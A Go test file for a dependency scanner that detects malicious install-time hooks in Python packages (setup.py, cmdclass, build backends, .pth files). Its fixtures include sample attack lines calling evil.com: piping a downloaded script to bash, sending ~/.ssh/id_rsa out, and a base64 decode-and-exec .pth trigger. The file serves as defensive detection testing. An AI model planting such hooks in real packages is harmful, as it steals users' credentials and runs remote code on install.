package pypi

import (
	"testing"

	"ihbv.io/depsnort/internal/ecosystem/instsurf"
	"ihbv.io/depsnort/internal/graph"
	"ihbv.io/depsnort/internal/installsurface"
)

func TestAnalyzePythonMaliciousSetupPy(t *testing.T) {
	setupPy := `
import os
import subprocess
import base64

os.system("curl https://evil.com/payload.sh | bash")
subprocess.Popen(["python", "-c", base64.b64decode("aW1wb3J0IHNvY2tldA==")])

from setuptools import setup
setup(name="innocent", version="1.0.0")
`
	s := installsurface.AnalyzePython(setupPy, "", nil)
	if len(s.Hooks) == 0 {
		t.Fatal("expected hooks from malicious setup.py")
	}
	h := s.Hooks[0]
	if h.Name != "setup.py:module-level" {
		t.Errorf("hook name = %q, want setup.py:module-level", h.Name)
	}

	hasCap := func(c installsurface.Capability) bool {
		for _, cap := range h.Caps {
			if cap == c {
				return true
			}
		}
		return false
	}
	if !hasCap(installsurface.CapNetwork) {
		t.Error("missing network capability (curl, https://evil.com)")
	}
	if !hasCap(installsurface.CapExec) {
		t.Error("missing exec capability (os.system, subprocess)")
	}
	if !hasCap(installsurface.CapObfuscation) {
		t.Error("missing obfuscation capability (base64.b64decode)")
	}
	if len(h.Artifacts) == 0 {
		t.Error("expected URL artifact for https://evil.com/payload.sh")
	}
}

func TestAnalyzePythonCleanSetupPy(t *testing.T) {
	setupPy := `
from setuptools import setup, find_packages

setup(
    name="clean-package",
    version="1.0.0",
    packages=find_packages(),
    install_requires=["requests>=2.28"],
)
`
	s := installsurface.AnalyzePython(setupPy, "", nil)
	if len(s.Hooks) != 0 {
		t.Errorf("clean setup.py should produce no hooks, got %d", len(s.Hooks))
	}
}

func TestAnalyzePythonCmdclass(t *testing.T) {
	setupPy := `
from setuptools import setup
from setuptools.command.install import install
import subprocess

class PostInstall(install):
    def run(self):
        install.run(self)
        subprocess.check_call(["curl", "-d", "@~/.ssh/id_rsa", "https://evil.com"])

setup(
    name="sneaky",
    version="1.0.0",
    cmdclass={"install": PostInstall},
)
`
	s := installsurface.AnalyzePython(setupPy, "", nil)
	var found bool
	for _, h := range s.Hooks {
		if h.Name == "setup.py:cmdclass.install" {
			found = true
		}
	}
	if !found {
		t.Error("cmdclass.install hook not detected")
	}
}

func TestAnalyzePythonNonStandardBuildBackend(t *testing.T) {
	toml := `
[build-system]
requires = ["custom-builder"]
build-backend = "custom_builder.api"
`
	s := installsurface.AnalyzePython("", toml, nil)
	if len(s.Hooks) != 1 {
		t.Fatalf("expected 1 hook for non-standard backend, got %d", len(s.Hooks))
	}
	if s.Hooks[0].Name != "pyproject.toml:build-backend" {
		t.Errorf("hook name = %q", s.Hooks[0].Name)
	}
}

func TestAnalyzePythonStandardBuildBackend(t *testing.T) {
	toml := `
[build-system]
requires = ["setuptools>=64", "wheel"]
build-backend = "setuptools.build_meta"
`
	s := installsurface.AnalyzePython("", toml, nil)
	if len(s.Hooks) != 0 {
		t.Errorf("standard build backend should produce no hooks, got %d", len(s.Hooks))
	}
}

func TestAnalyzePythonPthFile(t *testing.T) {
	pth := map[string]string{
		"evil.pth": "import os; os.system('curl https://evil.com/exfil')",
	}
	s := installsurface.AnalyzePython("", "", pth)
	if len(s.Hooks) != 1 {
		t.Fatalf("expected 1 hook for .pth import, got %d", len(s.Hooks))
	}
	if s.Hooks[0].Name != "pth:import" {
		t.Errorf("hook name = %q", s.Hooks[0].Name)
	}
}

func TestAnalyzePythonSafePthFile(t *testing.T) {
	pth := map[string]string{
		"safe.pth": "/path/to/my/package\n../other/path\n",
	}
	s := installsurface.AnalyzePython("", "", pth)
	if len(s.Hooks) != 0 {
		t.Errorf("path-only .pth should produce no hooks, got %d", len(s.Hooks))
	}
}

// pthHookHasCap reports whether the single pth:import hook carries a capability.
func pthHookHasCap(h installsurface.Hook, c installsurface.Capability) bool {
	for _, cap := range h.Caps {
		if cap == c {
			return true
		}
	}
	return false
}

// TestAnalyzePythonLitellmInitPth reproduces the real litellm 1.82.8 trigger
// (TeamPCP campaign, TEAMPCP-2026-0324): a single .pth line that spawns a
// detached interpreter which base64-decodes and exec()s an embedded payload. The
// credential theft itself lives in the decoded blob — a coverage frontier the
// static analyzer cannot read — but the decode-and-execute shape is visible on
// the .pth line and is what drives VC-002e. The analyzer must surface obfuscation
// AND exec so the check can fire.
func TestAnalyzePythonLitellmInitPth(t *testing.T) {
	pth := map[string]string{
		"litellm_init.pth": `import os, subprocess, sys; subprocess.Popen([sys.executable, "-c", "import base64; exec(base64.b64decode('aW1wb3J0IHNvY2tldA=='))"])`,
	}
	s := installsurface.AnalyzePython("", "", pth)
	if len(s.Hooks) != 1 {
		t.Fatalf("expected 1 pth hook, got %d", len(s.Hooks))
	}
	h := s.Hooks[0]
	if h.Name != "pth:import" {
		t.Errorf("hook name = %q, want pth:import", h.Name)
	}
	if !pthHookHasCap(h, installsurface.CapObfuscation) {
		t.Error("missing obfuscation capability (base64.b64decode) — VC-002e would not fire")
	}
	if !pthHookHasCap(h, installsurface.CapExec) {
		t.Error("missing exec capability (subprocess/exec)")
	}
}

// TestAnalyzePythonBenignBootstrapPth is the false-positive control: a real,
// legitimate pattern — a .pth that imports a package's own bootstrap module.
// analyzePthFile flags any import line as exec (a deliberate lower bound), so a
// hook IS produced, but it must NOT gain the obfuscation capability, so VC-002e
// (decode-and-execute) stays silent on it. This is the line the litellm case
// must sit on the far side of.
func TestAnalyzePythonBenignBootstrapPth(t *testing.T) {
	pth := map[string]string{
		"pkg_bootstrap.pth": "import mypkg._bootstrap",
	}
	s := installsurface.AnalyzePython("", "", pth)
	if len(s.Hooks) != 1 {
		t.Fatalf("expected 1 pth hook for the import line, got %d", len(s.Hooks))
	}
	if pthHookHasCap(s.Hooks[0], installsurface.CapObfuscation) {
		t.Error("a plain bootstrap import must not read as obfuscation — this would be a false positive")
	}
}

// TestExtractInstallSurfaceNilFetcher pins the CORRECTED contract (D-141).
//
// This test previously asserted the opposite — that a nil fetcher returns no
// error — which encoded the bug: with no fetcher, every dependency's install
// surface goes unexamined, and returning nothing reported that as "nothing to
// find". A skip rendered as an absence is the R-01 invisibility this codebase
// refuses everywhere else. The dependency is now disclosed as a gap.
func TestExtractInstallSurfaceNilFetcher(t *testing.T) {
	a := &Adapter{Sdist: nil}
	g := graph.New()
	g.AddNode(&graph.Node{ID: "pkg:pypi/foo@1.0.0", Ecosystem: "pypi", Name: "foo", Version: "1.0.0"})

	err := a.ExtractInstallSurface(".", g)
	if err == nil {
		t.Fatal("a nil fetcher leaves the dependency unexamined; that must surface as a gap, not silence")
	}
	gaps := instsurf.GapsOf(err)
	if len(gaps) != 1 || gaps[0].Package != "pkg:pypi/foo@1.0.0" {
		t.Fatalf("expected one gap naming the unexamined package, got %v", gaps)
	}
	if gaps[0].Reason != instsurf.GapUnavailable {
		t.Errorf("gap reason = %q, want %q", gaps[0].Reason, instsurf.GapUnavailable)
	}
}

func TestExtractBuildBackend(t *testing.T) {
	tests := []struct {
		toml string
		want string
	}{
		{`[build-system]
build-backend = "setuptools.build_meta"`, "setuptools.build_meta"},
		{`[build-system]
build-backend = 'flit_core.buildapi'`, "flit_core.buildapi"},
		{`[project]
name = "foo"`, ""},
		{`[build-system]
requires = ["setuptools"]

[project]
name = "foo"`, ""},
	}
	for _, tt := range tests {
		got := installsurface.ExtractBuildBackend(tt.toml)
		if got != tt.want {
			t.Errorf("extractBuildBackend(%q) = %q, want %q", tt.toml[:30], got, tt.want)
		}
	}
}
